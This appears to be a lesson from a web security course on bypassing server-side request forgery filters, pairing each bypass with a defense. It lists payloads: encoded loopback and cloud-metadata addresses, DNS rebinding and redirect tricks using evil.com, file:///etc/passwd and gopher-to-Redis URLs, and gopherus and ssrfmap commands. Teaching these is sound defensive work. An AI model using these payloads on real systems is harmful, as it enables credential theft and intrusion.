# Unit 10: A10 - Server-Side Request Forgery (SSRF) — Topic 4: SSRF Filter Bypass

## Overview

Many applications attempt to prevent SSRF by implementing URL filters — blocklists of internal IP ranges, allowlists of permitted domains, or protocol restrictions. However, these filters are notoriously **difficult to implement correctly**, and attackers have numerous techniques to bypass them. This topic covers common SSRF defenses and how they fail.

---

## 1. Common SSRF Filters and Bypasses

```
FILTER 1: Block "127.0.0.1" and "localhost"

BYPASSES:
  http://127.1/               ← Shortened form
  http://0x7f000001/          ← Hex encoding
  http://2130706433/          ← Decimal encoding
  http://017700000001/        ← Octal encoding
  http://[::1]/               ← IPv6 loopback
  http://0.0.0.0/             ← All interfaces
  http://127.0.0.1.nip.io/    ← DNS that resolves to 127.0.0.1
  http://spoofed.burpcollaborator.net/  ← DNS rebinding

FILTER 2: Block "169.254.169.254" (metadata)

BYPASSES:
  http://[::ffff:169.254.169.254]/     ← IPv6-mapped IPv4
  http://0xa9fea9fe/                    ← Hex encoding
  http://2852039166/                    ← Decimal encoding
  http://169.254.169.254.nip.io/        ← DNS resolution
  http://metadata.google.internal/      ← Alternative hostname (GCP)

FILTER 3: Block private IP ranges (10.x, 172.16-31.x, 192.168.x)

BYPASSES:
  http://0x0a000001/            ← 10.0.0.1 in hex
  http://0xac100001/            ← 172.16.0.1 in hex
  http://0xc0a80001/            ← 192.168.0.1 in hex
  Use DNS rebinding (resolve external to internal)
  URL shorteners that redirect to internal IPs
```

---

## 2. Advanced Bypass Techniques

### DNS Rebinding

```
DNS REBINDING:
  1. Attacker owns evil.com
  2. DNS for evil.com has very low TTL (0 seconds)
  3. First resolution: evil.com → 93.184.216.34 (attacker's IP)
     → Server validates: "Not internal, allow"
  4. Second resolution: evil.com → 169.254.169.254 (metadata!)
     → Server fetches: gets cloud credentials

TIMELINE:
  App validates URL → DNS resolves to public IP ✓
  App fetches URL   → DNS resolves to internal IP → SSRF!

DEFENSE: Resolve DNS, validate IP, then fetch using the resolved IP
```

### Redirect-Based Bypass

```
REDIRECT BYPASS:
  1. Attacker controls https://evil.com/redirect
  2. evil.com/redirect returns: HTTP 302 → http://169.254.169.254/...
  3. Server validates evil.com → "Not internal, allow"
  4. Server follows redirect → Fetches metadata

  # Setup on attacker server
  @app.route('/redirect')
  def redirect_ssrf():
      return redirect('http://169.254.169.254/latest/meta-data/')

DEFENSE: Don't follow redirects, or validate EACH redirect destination
```

### URL Parsing Inconsistencies

```
PARSER CONFUSION:
  Different libraries parse URLs differently!

  http://evil.com@169.254.169.254/
  ├── Some parsers: host = evil.com (userinfo@host)
  ├── Other parsers: host = 169.254.169.254
  └── If filter checks evil.com but fetcher uses 169.254.169.254 → bypass!

  http://169.254.169.254#@evil.com/
  http://evil.com%0d%0a%0d%0aHost:%20169.254.169.254/
  
  http://169.254.169.254\@evil.com/    ← Backslash confusion
  http://169。254。169。254/              ← Unicode dots
  http://169%2e254%2e169%2e254/         ← URL-encoded dots
```

---

## 3. Protocol-Based Bypasses

```
IF FILTER ONLY BLOCKS http:// AND https://:

file:///etc/passwd                 ← Read local files
gopher://internal:6379/...         ← Send arbitrary TCP data (Redis, SMTP)
dict://internal:6379/INFO          ← Dictionary protocol
ftp://internal-ftp:21/             ← FTP protocol
ldap://internal-ldap:389/          ← LDAP queries
jar:http://evil.com/evil.jar!/     ← Java archive
netdoc:///etc/passwd               ← Java-specific

GOPHER PROTOCOL — Most dangerous for SSRF:
  Allows sending arbitrary TCP data to any port
  Can interact with: Redis, Memcached, MySQL, SMTP, FastCGI
  Generate payloads with Gopherus tool:
    python3 gopherus.py --exploit redis
    python3 gopherus.py --exploit mysql
    python3 gopherus.py --exploit fastcgi
```

---

## 4. Encoding Bypasses

```
SAME IP, DIFFERENT REPRESENTATIONS:
  Target: 127.0.0.1

  Decimal:     2130706433
  Hex:         0x7f000001
  Octal:       017700000001
  Mixed:       0x7f.0.0.1
  IPv6:        [::1]
  IPv6-mapped: [::ffff:127.0.0.1]
  Shortened:   127.1
  With zeros:  127.000.000.001

URL ENCODING:
  %31%32%37%2e%30%2e%30%2e%31  →  127.0.0.1
  
DOUBLE ENCODING:
  %2531%2532%2537%252e%2530%252e%2530%252e%2531  →  127.0.0.1

UNICODE:
  ①②⑦.⓪.⓪.① (unicode circles)
  
CNAME CHAINS:
  evil.com CNAME → internal.evil.com CNAME → 127.0.0.1
```

---

## 5. Testing SSRF Filters

```bash
# Automated bypass testing with tools

# SSRFmap — Automated SSRF exploitation
python3 ssrfmap.py -r request.txt -p url -m readfiles

# Generate various IP representations
python3 -c "
import ipaddress
ip = '169.254.169.254'
packed = int(ipaddress.IPv4Address(ip))
print(f'Decimal: {packed}')
print(f'Hex: {hex(packed)}')
print(f'Octal: {oct(packed)}')
print(f'IPv6-mapped: [::ffff:{ip}]')
"

# Bypass wordlist examples (use with Burp Intruder)
# localhost variants
127.0.0.1
127.1
127.0.1
0x7f000001
2130706433
017700000001
[::1]
[::ffff:127.0.0.1]
0.0.0.0
localhost
LOCALHOST
localHOST
127.0.0.1.nip.io
```

---

## Summary Table

| Bypass Technique | How It Works | Defense |
|-----------------|--------------|---------|
| IP encoding | Hex/decimal/octal representations | Parse and normalize before checking |
| DNS rebinding | DNS changes between validation and fetch | Pin DNS resolution |
| Open redirect | Follow redirect to internal target | Don't follow redirects |
| URL parsing | Parser inconsistencies | Use single parser for validation and fetch |
| Protocol smuggling | gopher://, file://, dict:// | Allowlist http(s) only |
| Unicode/encoding | Special characters bypass string matching | Canonicalize before validation |

---

## Revision Questions

1. List five ways to represent 127.0.0.1 that might bypass a blocklist filter.
2. Explain DNS rebinding and how it bypasses SSRF validation.
3. How do open redirects enable SSRF filter bypass?
4. Why is the gopher:// protocol particularly dangerous for SSRF attacks?
5. What URL parsing inconsistencies can be exploited to bypass SSRF filters?
6. Design a defense that is resistant to all the bypass techniques covered.

---

*Previous: [03-internal-service-access.md](03-internal-service-access.md) | Next: [05-prevention-techniques.md](05-prevention-techniques.md)*

---

*[Back to README](../README.md)*
